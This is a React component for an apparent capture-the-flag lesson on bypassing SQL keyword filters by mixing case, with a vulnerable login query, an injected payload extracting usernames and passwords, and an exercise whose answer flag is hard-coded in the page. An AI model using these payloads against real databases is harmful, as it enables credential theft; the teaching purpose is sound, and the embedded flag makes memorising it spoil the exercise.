import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TableRow from '@mui/material/TableRow';
import Paper from '@mui/material/Paper';
import FlagInput from '../components/FlagInput';
import { Link } from 'react-router-dom';

const CaseBypassLesson = () => {
  return (
    <div className="p-6 bg-white rounded shadow-md max-w-3xl ml-0">
      <h1 className="text-3xl font-bold mb-6">🔡 Case-Insensitive Keyword Bypass</h1>

      <section className="mb-8">
        <p className="text-base mb-4">
          Some websites try to block SQL injection by filtering keywords like <code>UNION</code>, <code>SELECT</code>, and <code>FROM</code>.
          <br />
          However, SQL is case-insensitive — keywords can be written in any casing.
          <br />
          Attackers often use mixed casing to bypass these weak filters.
        </p>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">💡 Syntax</h2>
        <p className="mt-2">Instead of writing:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus}>
          {`UNION SELECT username, password FROM users --`}
        </SyntaxHighlighter>
        <p className="mt-2">You can bypass filters with:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus}>
          {`UnIoN SeLeCt username, password FroM users --`}
        </SyntaxHighlighter>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🔍 Injected Example</h2>
        <p>The original query might be:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus}>
          {`SELECT * FROM users WHERE username = '$username' AND password = '$password';`}
        </SyntaxHighlighter>

        <p className="mt-2">Injected input:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus}>
          {`' UnIoN SeLeCt username, password FroM users --`}
        </SyntaxHighlighter>

        <p className="mt-2">Becomes:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus}>
          {`SELECT * FROM users WHERE username = ''  UnIoN SeLeCt username, password FroM users --' AND password = '';`}
        </SyntaxHighlighter>

        <p className="mt-4">This bypasses filters and extracts data due to case insensitivity.</p>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🧠 Explanation</h2>
        <TableContainer component={Paper} sx={{ maxWidth: 500, backgroundColor: '#f9f9f9' }}>
          <Table size="small">
            <TableHead>
              <TableRow>
                <TableCell><strong>Part</strong></TableCell>
                <TableCell><strong>Meaning</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              <TableRow>
                <TableCell><code>'</code></TableCell>
                <TableCell>Closes the original string input</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>UnIoN SeLeCt</code></TableCell>
                <TableCell>Mixed-case keyword to bypass filter</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>FroM users</code></TableCell>
                <TableCell>Also case-altered, still valid</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>--</code></TableCell>
                <TableCell>Comments out remaining SQL</TableCell>
              </TableRow>
            </TableBody>
          </Table>
        </TableContainer>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🧪 SQLi Exercise</h2>
        <p>Try to bypass the filter by changing the casing of keywords:
        <br />
        I hide my flag in the secret inside my session_table.</p>
        <Link to="/bypass-simulator">
          <button className="bg-purple-600 text-white font-bold px-4 py-2 rounded">
            Try Case Bypass
          </button>
        </Link>

      </section>

      <section className="mt-8">
        <h2 className="text-xl font-semibold mb-2">🏁 Submit Your Flag</h2>
        <p className="text-base mb-2">If you extracted the flag, enter it below:</p>
        <FlagInput correctFlag="flag{case_insensitive_bypass}" />
      </section>
    </div>
  );
};

export default CaseBypassLesson;
